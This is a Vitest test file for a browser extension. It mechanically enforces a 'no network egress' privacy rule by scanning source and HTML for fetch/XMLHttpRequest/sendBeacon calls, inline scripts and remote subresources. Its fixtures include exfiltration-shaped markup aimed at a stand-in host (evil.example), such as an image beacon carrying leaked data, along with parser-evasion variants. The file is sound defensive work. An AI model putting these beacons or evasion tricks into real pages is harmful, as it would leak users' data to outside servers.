import { describe, it, expect } from 'vitest';
import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';

// Golden principle #1 (local-only, no exfiltration) enforced mechanically:
// no external-network primitive may appear anywhere in the extension source.
// Downloads use URL.createObjectURL + <a download> (all local), so these tokens
// are never legitimately needed here. Any PR that adds one turns this gate red.
// See docs/conventions.md "Privacy invariant".
const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');

// The whole source tree, matching the invariant's own scope: a network call in
// src/core or src/settings exfiltrates just as effectively as one in an adapter.
const SCAN_DIRS = ['src'];

// Forbidden external-network primitives. Call-shaped for fetch/sendBeacon to
// avoid matching unrelated identifiers; bare token for XMLHttpRequest (its mere
// presence in these paths is the smell). navigator.sendBeacon is covered by the
// sendBeacon( pattern.
const FORBIDDEN: ReadonlyArray<{ name: string; pattern: RegExp }> = [
  { name: 'fetch()', pattern: /\bfetch\s*\(/ },
  { name: 'XMLHttpRequest', pattern: /\bXMLHttpRequest\b/ },
  { name: 'sendBeacon()', pattern: /\bsendBeacon\s*\(/ },
];

// Cover every JS/TS module flavor, not just .ts(x): a future non-TS file in a
// guarded path must not slip a network call past the gate.
const SOURCE_FILE_RE = /\.(tsx?|jsx?|mjs|cjs)$/;

// The extension ships exactly one HTML file today (the options page), but the
// invariant is about the file type, not that one path.
const HTML_FILE_RE = /\.html?$/;

function collectFiles(absDir: string, match: RegExp): string[] {
  let entries;
  try {
    entries = readdirSync(absDir, { withFileTypes: true });
  } catch {
    // Unreadable directory — scan nothing rather than throw. For the `src` root
    // itself that is caught loudly by the "scans at least one source file" guard
    // below, which is the renamed/moved-source-tree case. It does NOT cover a
    // recursive call: an unreadable SUBdirectory is skipped silently, because the
    // sibling directories still yield files and the guard passes. Pre-existing and
    // never observed; noted so the guard is not read as broader than it is.
    return [];
  }
  const files: string[] = [];
  for (const entry of entries) {
    const abs = join(absDir, entry.name);
    if (entry.isDirectory()) {
      files.push(...collectFiles(abs, match));
    } else if (match.test(entry.name)) {
      files.push(abs);
    }
  }
  return files;
}

// Blank out comments and string/template literals (replacing their content with
// spaces, preserving newlines so line numbers stay accurate) before matching.
// This defeats two parser-differential evasions the naive per-line scan missed:
// a call split across lines (`fetch\n(`), which the FORBIDDEN patterns' `\s*`
// now spans over the preserved newlines; and a forbidden token that only looks
// like code but sits in a comment or string literal (a false positive we skip).
//
// Known limitation (accepted): template-literal `${...}` interpolation is blanked
// along with the surrounding literal, so a call inside it (`` `${fetch(x)}` ``) is
// NOT flagged. Descending into interpolation needs brace-nesting parsing — a
// semantic escape this static tripwire is deliberately not meant to resist (see
// the finding note in docs / the CodeQL data-flow option in backlog.md). Regex
// literals are treated as normal code, so a forbidden token inside one over-reports
// (safe direction).
function stripCommentsAndStrings(source: string): string {
  let out = '';
  let state: 'normal' | 'line' | 'block' | 'single' | 'double' | 'template' = 'normal';
  for (let i = 0; i < source.length; i++) {
    const c = source[i];
    const next = source[i + 1];
    switch (state) {
      case 'normal':
        if (c === '/' && next === '/') { state = 'line'; out += '  '; i++; }
        else if (c === '/' && next === '*') { state = 'block'; out += '  '; i++; }
        else if (c === "'") { state = 'single'; out += ' '; }
        else if (c === '"') { state = 'double'; out += ' '; }
        else if (c === '`') { state = 'template'; out += ' '; }
        else out += c;
        break;
      case 'line':
        if (c === '\n') { state = 'normal'; out += '\n'; }
        else out += ' ';
        break;
      case 'block':
        if (c === '*' && next === '/') { state = 'normal'; out += '  '; i++; }
        else out += c === '\n' ? '\n' : ' ';
        break;
      case 'single':
      case 'double':
      case 'template':
        if (c === '\\') { out += ' '; out += next === '\n' ? '\n' : ' '; i++; }
        else if ((state === 'single' && c === "'") ||
                 (state === 'double' && c === '"') ||
                 (state === 'template' && c === '`')) { state = 'normal'; out += ' '; }
        else out += c === '\n' ? '\n' : ' ';
        break;
    }
  }
  return out;
}

// Scan one already-read source for forbidden primitives, returning `label:line — name`
// for each hit. Comments/strings are blanked first so only real code matches.
function scanForViolations(rawSource: string, label: string): string[] {
  const source = stripCommentsAndStrings(rawSource);
  const violations: string[] = [];
  for (const { name, pattern } of FORBIDDEN) {
    const re = new RegExp(pattern.source, 'g');
    let m: RegExpExecArray | null;
    while ((m = re.exec(source)) !== null) {
      const lineNo = source.slice(0, m.index).split('\n').length;
      violations.push(`${label}:${lineNo} — ${name}`);
      if (m.index === re.lastIndex) re.lastIndex++; // guard against a zero-width match looping
    }
  }
  return violations;
}

// The HTML half of the invariant. The collector above reads JS/TS only, so an inline
// `<script>` in the options page — the one place this extension ships HTML — would carry
// a fetch() straight past the gate. Rather than run the JS tokenizer over HTML (it
// mis-tokenizes apostrophes in prose and `<!-- -->` comments, over-reporting noisily),
// assert the rule that is already true and already required: MV3's CSP forbids inline
// script in extension pages, so every `<script>` must load a `src=` module — and it must
// be a module the JS/TS half above actually reads, i.e. a relative path inside the tree.
// A remote `src` would be egress that neither half sees; an out-of-tree one loads code
// nothing scanned. Together the two halves read every executable-code file type present
// in `src/` — not every file (the `.ttf`/`.txt` under `src/export/fonts` are inert), and
// a future `.json`/`.vue`/`.svelte` would reopen the gap.
//
// Scope note: this checks `<script>` only. Every OTHER remote subresource in HTML is covered
// by findSubresourceViolations below, and blocked at runtime by the extension-pages CSP in
// manifest.config.ts (the primary control; this half is the static backup).

// Walk a tag's attribute text and yield every `name → raw value` pair (value quotes included,
// `undefined` for a valueless attribute). Walks by attribute NAME rather than substring-matching
// the blob: `src=` also occurs inside `data-src="…"` (a different attribute) and inside another
// attribute's quoted VALUE (`data-x="see src=a.js"`), and either read would let a genuine inline
// script through — the unsafe direction.
function readAttributes(attrs: string): Array<{ name: string; value: string | undefined }> {
  const re = /([\w:-]+)(?:\s*=\s*("[^"]*"|'[^']*'|[^\s>]*))?/g;
  const out: Array<{ name: string; value: string | undefined }> = [];
  let a: RegExpExecArray | null;
  while ((a = re.exec(attrs)) !== null) out.push({ name: a[1], value: a[2] });
  return out;
}

// Return the raw `src` attribute value (quotes included) of a tag's attribute text, or
// null when it has no `src` or a valueless one. Treating a valueless `src` as no source
// over-reports, which is the safe way.
function readSrcValue(attrs: string): string | null {
  for (const { name, value } of readAttributes(attrs)) {
    if (name.toLowerCase() === 'src' && value !== undefined) return value;
  }
  return null;
}

// A `<script src=…>` is only benign because the module it loads is itself scanned by the
// JS/TS half. That holds for a relative path inside the tree and for nothing else: an
// absolute or protocol-relative URL fetches from another origin — the exact egress Golden
// Principle #1 forbids — and a `..` segment escapes `src/` into files nothing reads.
function isLocalInTreeSrc(rawValue: string): boolean {
  const value = rawValue.replace(/^["']|["']$/g, '').trim();
  if (value === '') return false;
  if (/^[a-z][a-z0-9+.-]*:/i.test(value)) return false; // https:, data:, javascript:
  if (value.startsWith('//')) return false; // protocol-relative
  return !value.split(/[/\\]/).includes('..');
}

// Return a tag's attribute text — everything from `from` up to the tag-closing `>`.
// Follows the HTML tokenizer's attribute states rather than toggling on any quote char:
// a quote only opens a value when it sits in value position (right after `=`). Toggling
// on every quote desynchronizes the scan from the real parser in the UNSAFE direction —
// a quote in NAME position (`<script x">…`) or inside an UNQUOTED value
// (`<script data-x=a"b >…`) made the scanner run past the true tag end into the script
// body, where a `src=…` in the code re-tokenized as a real source attribute and masked a
// genuine inline script (both verified against a real parser). A `>` inside a properly
// quoted value still does not end the tag. Returns null when the tag never closes; a real
// parser drops such a tag entirely, and the caller flags it anyway (over-report, safe).
function readTagAttributes(html: string, from: number): string | null {
  let quote: '"' | "'" | null = null;
  let afterEquals = false;
  for (let i = from; i < html.length; i++) {
    const c = html[i];
    if (quote !== null) {
      if (c === quote) quote = null;
      continue;
    }
    if (c === '>') return html.slice(from, i);
    if (afterEquals && (c === '"' || c === "'")) {
      quote = c;
      afterEquals = false;
    } else if (c === '=') {
      afterEquals = true;
    } else if (!/\s/.test(c)) {
      afterEquals = false;
    }
  }
  return null;
}

// Report every `<script>` that runs code the JS/TS half never read — an inline body, or a
// remote/out-of-tree `src`. Returns `label:line — reason` per hit. Deliberately narrow
// tag matching, because the expected violation count is zero and what inaccuracy remains
// points the safe way: a `<script>` inside an `<!-- -->` comment is still flagged.
function findScriptViolations(rawHtml: string, label: string): string[] {
  const violations: string[] = [];
  const re = /<script\b/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(rawHtml)) !== null) {
    const attrs = readTagAttributes(rawHtml, re.lastIndex);
    const src = attrs === null ? null : readSrcValue(attrs);
    if (src !== null && isLocalInTreeSrc(src)) continue;
    const lineNo = rawHtml.slice(0, m.index).split('\n').length;
    const reason = src === null ? 'inline <script>' : 'remote or out-of-tree <script src>';
    violations.push(`${label}:${lineNo} — ${reason}`);
  }
  return violations;
}

// Attributes the browser fetches from on its own, or that decide where such a fetch goes.
// Chosen by FETCH SEMANTICS, not by "looks like a URL": each of these pulls bytes from the
// value's origin with no user action, which is exactly the egress Golden Principle #1 forbids.
// `src` covers img/iframe/audio/video/source/track/embed/input[type=image]; `data` is <object>;
// `action`/`formaction` are submission targets a script can trigger.
const URL_ATTRS = new Set(['src', 'srcset', 'poster', 'data', 'action', 'formaction']);

// `href` is checked on these tags ONLY. On <link> it is an auto-fetched subresource; on <base>
// it retargets every relative URL on the page, which would turn the local-path allowance below
// into a remote fetch. On <a>/<area> it is user-initiated NAVIGATION, not a fetch — checking it
// would redden this gate the day the options page gains a legitimate outbound link.
const HREF_TAGS = new Set(['link', 'base']);

// Split a `srcset` into its candidate URLs (the token before each descriptor). Commas inside a
// URL would split wrongly, but every such URL carries a scheme (`data:`) and is rejected anyway,
// and a spurious extra candidate only over-reports — the safe direction.
function splitSrcset(rawValue: string): string[] {
  return rawValue
    .replace(/^["']|["']$/g, '')
    .split(',')
    .map((candidate) => candidate.trim().split(/\s+/)[0])
    .filter((candidate) => candidate !== ''); // an empty candidate fetches nothing
}

// Report every URL-bearing attribute and CSS `url()` whose target is not a relative in-tree path.
// This is the half PR #41 left open: MV3's default CSP restricts executable code only, so a remote
// `<img src>`/`<iframe>`/`<form action>` — or a `url()` in the options page's inline `<style>` —
// was a working outbound channel that neither half of the gate read. Reuses isLocalInTreeSrc, so
// a scheme (`https:`, `data:`), a protocol-relative `//host`, and a `..` escape are all rejected.
function findSubresourceViolations(rawHtml: string, label: string): string[] {
  const violations: string[] = [];
  const lineOf = (index: number) => rawHtml.slice(0, index).split('\n').length;

  const tagRe = /<([a-zA-Z][\w:-]*)/g;
  let m: RegExpExecArray | null;
  while ((m = tagRe.exec(rawHtml)) !== null) {
    const tag = m[1].toLowerCase();
    // A tag left open at EOF IS dropped by a real parser (measured: happy-dom yields no element),
    // so it fetches nothing — but scan its text anyway rather than skipping. A file broken that
    // badly is not one whose parse anybody should be leaning on, and over-reporting is the safe
    // direction. Note this is only the EOF case: a tag merely missing its own `>` absorbs the
    // following markup up to the next one, which readTagAttributes already reproduces.
    const attrs = readTagAttributes(rawHtml, tagRe.lastIndex) ?? rawHtml.slice(tagRe.lastIndex);
    for (const { name, value } of readAttributes(attrs)) {
      const attr = name.toLowerCase();
      // A valueless attribute (`<img src>`) parses to an EMPTY value, not to an absent one
      // (measured). Empty resolves against the page's own URL, never off-origin, so it is not
      // egress and is skipped — the one place this detector is narrower than the parser.
      const fetches = URL_ATTRS.has(attr) || (attr === 'href' && HREF_TAGS.has(tag));
      if (!fetches || value === undefined) continue;
      const targets = attr === 'srcset' ? splitSrcset(value) : [value];
      for (const target of targets) {
        if (isLocalInTreeSrc(target)) continue;
        violations.push(`${label}:${lineOf(m.index)} — remote or out-of-tree <${tag} ${attr}>`);
      }
    }
  }

  // CSS `url()` — the options page is majority inline `<style>`, and a `background: url(https://…)`
  // there fetches just as automatically as an `<img>`. Scanning the raw text covers both `<style>`
  // blocks and `style=` attributes without a CSS parser.
  const cssUrlRe = /url\(\s*("[^"]*"|'[^']*'|[^)]*?)\s*\)/gi;
  let u: RegExpExecArray | null;
  while ((u = cssUrlRe.exec(rawHtml)) !== null) {
    if (isLocalInTreeSrc(u[1])) continue;
    violations.push(`${label}:${lineOf(u.index)} — remote or out-of-tree CSS url()`);
  }

  // `@import` takes a bare string as well as a url(), and the bare form is the one the scan above
  // misses. It fetches a whole remote stylesheet, which can then pull further subresources.
  const cssImportRe = /@import\s+("[^"]*"|'[^']*')/gi;
  let i: RegExpExecArray | null;
  while ((i = cssImportRe.exec(rawHtml)) !== null) {
    if (isLocalInTreeSrc(i[1])) continue;
    violations.push(`${label}:${lineOf(i.index)} — remote or out-of-tree CSS @import`);
  }

  return violations;
}

describe('privacy invariant: no external-network primitives anywhere in src/', () => {
  const files = SCAN_DIRS.flatMap((dir) => collectFiles(join(REPO_ROOT, dir), SOURCE_FILE_RE));

  it('scans at least one source file', () => {
    // Guards against the gate silently passing because a path typo made it scan
    // nothing (e.g. the source root was renamed). src/ always has code.
    expect(files.length).toBeGreaterThan(0);
  });

  it('contains no fetch/XMLHttpRequest/sendBeacon calls', () => {
    const violations = files.flatMap((file) =>
      scanForViolations(readFileSync(file, 'utf8'), relative(REPO_ROOT, file)),
    );
    expect(violations, `external-network primitive(s) found:\n${violations.join('\n')}`).toEqual([]);
  });
});

describe('privacy invariant: every script in src/ HTML loads an in-tree module', () => {
  const htmlFiles = SCAN_DIRS.flatMap((dir) => collectFiles(join(REPO_ROOT, dir), HTML_FILE_RE));

  it('scans at least one HTML file', () => {
    // Same renamed/moved-tree guard as the source scan: if the options page were
    // moved out of `src/`, this gate would pass by scanning nothing.
    expect(htmlFiles.length).toBeGreaterThan(0);
  });

  it('loads every script from a relative in-tree src= module', () => {
    const violations = htmlFiles.flatMap((file) =>
      findScriptViolations(readFileSync(file, 'utf8'), relative(REPO_ROOT, file)),
    );
    expect(
      violations,
      `script(s) the JS/TS scan cannot read (move the code to a relative module under src/):\n${violations.join('\n')}`,
    ).toEqual([]);
  });

  it('loads every subresource from a relative in-tree path', () => {
    // The other half of the same invariant: a remote `<img>`/`<iframe>`/`<form action>` or CSS
    // `url()` is an outbound request carrying whatever the page can read. Blocked at runtime by
    // the extension-pages CSP in manifest.config.ts; caught here before it ever ships.
    const violations = htmlFiles.flatMap((file) =>
      findSubresourceViolations(readFileSync(file, 'utf8'), relative(REPO_ROOT, file)),
    );
    expect(
      violations,
      `remote subresource(s) found (bundle the asset under src/ and reference it relatively):\n${violations.join('\n')}`,
    ).toEqual([]);
  });
});

describe('privacy gate detector: hardening against parser-differential evasion', () => {
  it('catches a call split across lines', () => {
    expect(scanForViolations('const x = fetch\n  (url);', 'f')).toEqual(['f:1 — fetch()']);
  });

  it('catches a token followed by a comment before the paren', () => {
    expect(scanForViolations('sendBeacon /* sneaky */ (data);', 'f')).toEqual(['f:1 — sendBeacon()']);
  });

  it('ignores a forbidden token inside a line comment', () => {
    expect(scanForViolations('// fetch(url) is documented here', 'f')).toEqual([]);
  });

  it('ignores a forbidden token inside a block comment', () => {
    expect(scanForViolations('/* example: XMLHttpRequest */\nconst ok = 1;', 'f')).toEqual([]);
  });

  it('ignores a forbidden token inside a string literal', () => {
    expect(scanForViolations('const s = "fetch(url)";', 'f')).toEqual([]);
  });

  it('ignores a forbidden token inside a template literal', () => {
    expect(scanForViolations('const s = `call fetch(x)`;', 'f')).toEqual([]);
  });

  it('reports the correct line number after preceding comments/strings', () => {
    const src = '// header\nconst s = "noise";\nfetch(url);';
    expect(scanForViolations(src, 'f')).toEqual(['f:3 — fetch()']);
  });

  it('still catches a real call adjacent to a string literal', () => {
    expect(scanForViolations('const u = "path"; fetch(u);', 'f')).toEqual(['f:1 — fetch()']);
  });
});

describe('privacy gate detector: inline <script> in HTML', () => {
  it('flags a bare inline script', () => {
    expect(findScriptViolations('<body>\n<script>fetch(url)</script>\n</body>', 'h')).toEqual([
      'h:2 — inline <script>',
    ]);
  });

  it('flags an inline script that carries other attributes', () => {
    expect(findScriptViolations('<script type="module">fetch(url)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('allows a script that loads a src= module', () => {
    expect(findScriptViolations('<script type="module" src="./main.ts"></script>', 'h')).toEqual([]);
  });

  it('allows src= written first, single-quoted, or spaced around the =', () => {
    expect(findScriptViolations("<script src = './a.js' defer></script>", 'h')).toEqual([]);
  });

  it('does not mistake a src-suffixed attribute name for src', () => {
    expect(findScriptViolations('<script data-src="x">code</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
    expect(findScriptViolations('<script data-srcset="x">code</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('does not mistake a src= substring inside another attribute value for src', () => {
    expect(findScriptViolations('<script data-x="see src=a.js">fetch(u)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
    expect(findScriptViolations("<script title='src=b.js'>fetch(u)</script>", 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('does not let a > inside a quoted value truncate the tag into a fake src', () => {
    // Both build a real inline script in a browser parser (no src attribute, body runs).
    expect(findScriptViolations('<script data-x="pre src=oops.js> more" >fetch(u)</script>', 'h')).toEqual(
      ['h:1 — inline <script>'],
    );
    expect(findScriptViolations('<script data-x="a src=b.js>" >fetch(u)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('does not treat a quote in attribute-NAME position as opening a value', () => {
    // A real parser closes the tag at the first `>` here, yielding attribute `x"` with no
    // src and the body `var s = " src=a.js >"; fetch(u)` — a genuine inline script.
    // Toggling quote state on any quote char instead ran the scan into that body, where
    // `src=a.js` re-tokenized as a real source. Verified against Chromium and happy-dom.
    expect(findScriptViolations('<script x">var s = " src=a.js >"; fetch(u)</script>', 'h')).toEqual(
      ['h:1 — inline <script>'],
    );
  });

  it('does not treat a quote inside an UNQUOTED value as opening a value', () => {
    // Same desync one state over: the `"` in `data-x=a"b` is a literal, and the value ends
    // at the whitespace. A real parser gives tag 1 no src and the body `fetch(u)`.
    const html = '<script data-x=a"b >fetch(u)</script>\n<script src="c.js" data-y="a src=1.js>"></script>';
    expect(findScriptViolations(html, 'h')).toEqual(['h:1 — inline <script>']);
  });

  it('flags a script loaded from a remote origin', () => {
    // The gate's whole justification is that a `src=` module is one the JS/TS half reads.
    // A remote URL is egress neither half sees — Golden Principle #1's exact prohibition.
    expect(findScriptViolations('<script src="https://evil.example/x.js"></script>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <script src>',
    ]);
    expect(findScriptViolations('<script src="//evil.example/x.js"></script>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <script src>',
    ]);
    expect(findScriptViolations('<script src="data:text/javascript,fetch(u)"></script>', 'h')).toEqual(
      ['h:1 — remote or out-of-tree <script src>'],
    );
  });

  it('flags a script whose src escapes the scanned tree', () => {
    expect(
      findScriptViolations('<script src="../../node_modules/foo/dist/foo.js"></script>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <script src>']);
  });

  it('flags a tag whose quote is never closed', () => {
    // A real parser drops the unterminated tag entirely, so nothing runs either way.
    expect(findScriptViolations('<script data-x="src=a.js>fetch(u)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('flags a valueless src attribute', () => {
    // Loads nothing, so the body is still inline. Over-reporting, the safe way.
    expect(findScriptViolations('<script src>code</script>', 'h')).toEqual(['h:1 — inline <script>']);
  });

  it('allows an unquoted src value', () => {
    expect(findScriptViolations('<script src=./main.js defer></script>', 'h')).toEqual([]);
  });

  it('reports every inline script in a file', () => {
    const html = '<script>a</script>\n<script src="b.js"></script>\n<script>c</script>';
    expect(findScriptViolations(html, 'h')).toEqual(['h:1 — inline <script>', 'h:3 — inline <script>']);
  });
});

describe('privacy gate detector: remote subresources in HTML', () => {
  it('flags the payload that passed the pre-#42 gate', () => {
    // The exact markup verified green against the `<script>`-only gate when this residual was
    // raised. It is a working exfiltration channel: the query string carries whatever the page read.
    expect(findSubresourceViolations('<img src="https://evil.example/p.gif?d=leak">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
  });

  it('flags a protocol-relative iframe', () => {
    expect(findSubresourceViolations('<iframe src="//evil.example/x"></iframe>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <iframe src>',
    ]);
  });

  it('flags a remote form target on either attribute', () => {
    expect(findSubresourceViolations('<form action="https://evil.example/c"></form>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <form action>',
    ]);
    expect(
      findSubresourceViolations('<button formaction="https://evil.example/c">go</button>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <button formaction>']);
  });

  it('flags a remote candidate inside an otherwise local srcset', () => {
    expect(
      findSubresourceViolations('<img srcset="./b.png 2x, https://evil.example/a.png 1x">', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <img srcset>']);
  });

  it('flags a remote object data and video poster', () => {
    expect(findSubresourceViolations('<object data="https://evil.example/x"></object>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <object data>',
    ]);
    expect(findSubresourceViolations('<video poster="https://evil.example/p.jpg"></video>', 'h')).toEqual(
      ['h:1 — remote or out-of-tree <video poster>'],
    );
  });

  it('checks href on <link> and <base> but not on <a>', () => {
    // <link> auto-fetches and <base> retargets every relative URL on the page — both are the
    // gate's business. An <a> is user-initiated navigation, so an outbound link in the options
    // page is legitimate and must not turn this red.
    expect(findSubresourceViolations('<link rel="stylesheet" href="./style.css">', 'h')).toEqual([]);
    expect(findSubresourceViolations('<link rel="stylesheet" href="https://cdn.example/x.css">', 'h')).toEqual(
      ['h:1 — remote or out-of-tree <link href>'],
    );
    expect(findSubresourceViolations('<base href="https://evil.example/">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <base href>',
    ]);
    expect(findSubresourceViolations('<a href="https://chatgpt.com">docs</a>', 'h')).toEqual([]);
  });

  it('flags a data: URI', () => {
    // Deliberate: no data: URI exists anywhere in src/, isLocalInTreeSrc rejects every scheme, and
    // allowing the scheme here would also admit `data:text/html`. A future inline asset argues its
    // own allowance rather than inheriting one nobody reviewed.
    expect(findSubresourceViolations('<img src="data:image/png;base64,iVBOR">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
  });

  it('flags a remote CSS url() in an inline style block', () => {
    const html = '<style>\nbody { background: url(https://evil.example/bg.png); }\n</style>';
    expect(findSubresourceViolations(html, 'h')).toEqual(['h:2 — remote or out-of-tree CSS url()']);
  });

  it('flags a remote CSS @import in either form', () => {
    // `@import` accepts a bare string, which the url() scan does not see. It pulls a whole remote
    // stylesheet, which can then pull further subresources of its own.
    expect(findSubresourceViolations('<style>@import "https://evil.example/x.css";</style>', 'h')).toEqual([
      'h:1 — remote or out-of-tree CSS @import',
    ]);
    expect(findSubresourceViolations("<style>@import url('https://evil.example/x.css');</style>", 'h')).toEqual([
      'h:1 — remote or out-of-tree CSS url()',
    ]);
    expect(findSubresourceViolations('<style>@import "./theme.css";</style>', 'h')).toEqual([]);
  });

  it('allows a local CSS url(), quoted or bare', () => {
    expect(findSubresourceViolations('<style>body{background:url(./bg.png)}</style>', 'h')).toEqual([]);
    expect(findSubresourceViolations('<style>body{background:url("./bg.png")}</style>', 'h')).toEqual([]);
  });

  it('allows relative in-tree assets', () => {
    expect(findSubresourceViolations('<img src="./icons/icon16.png">', 'h')).toEqual([]);
    expect(findSubresourceViolations('<script type="module" src="./main.ts"></script>', 'h')).toEqual([]);
  });

  it('ignores an attribute the browser never fetches', () => {
    // `data-src` is inert markup — no fetch without a lazy-loader, and no such code exists in src/.
    expect(findSubresourceViolations('<img data-src="https://evil.example/x.png">', 'h')).toEqual([]);
  });

  it('ignores a valueless URL attribute', () => {
    expect(findSubresourceViolations('<img src>', 'h')).toEqual([]);
  });

  it('flags an out-of-tree relative path', () => {
    expect(findSubresourceViolations('<img src="../../node_modules/foo/x.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
  });

  it('agrees with a real parser on the tokenization-differential shapes', () => {
    // The class of payload that produced five false negatives in the `<script>` half. Each
    // expectation below was diffed against happy-dom's actual parse, not reasoned about.
    // A `>` inside a quoted value does not end the tag, so the only real src is the local one.
    expect(
      findSubresourceViolations('<img data-x="a src=https://evil.example/x.png>" src="./ok.png">', 'h'),
    ).toEqual([]);
    // A quote in NAME position does not open a value: the parser closes tag 1 at the first `>`,
    // leaving it srcless, and the remote src belongs to tag 2.
    expect(findSubresourceViolations('<img x"><img src="https://evil.example/y.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
    // A quote inside an UNQUOTED value is a literal; the value ends at the whitespace.
    expect(findSubresourceViolations('<img data-x=a"b src="https://evil.example/z.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
    // Attribute and tag names are case-insensitive to the parser, so they must be here too.
    expect(findSubresourceViolations('<IMG SRC="https://evil.example/upper.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
    // Left open at EOF the parser drops the tag, so nothing fetches — flagged anyway, on purpose.
    expect(findSubresourceViolations('<img src="https://evil.example/eof.png"', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
    ]);
  });

  it('reports every offending tag in a file, with its line', () => {
    const html = '<img src="https://a.example/1.png">\n<img src="./ok.png">\n<iframe src="https://b.example/"></iframe>';
    expect(findSubresourceViolations(html, 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>',
      'h:3 — remote or out-of-tree <iframe src>',
    ]);
  });
});
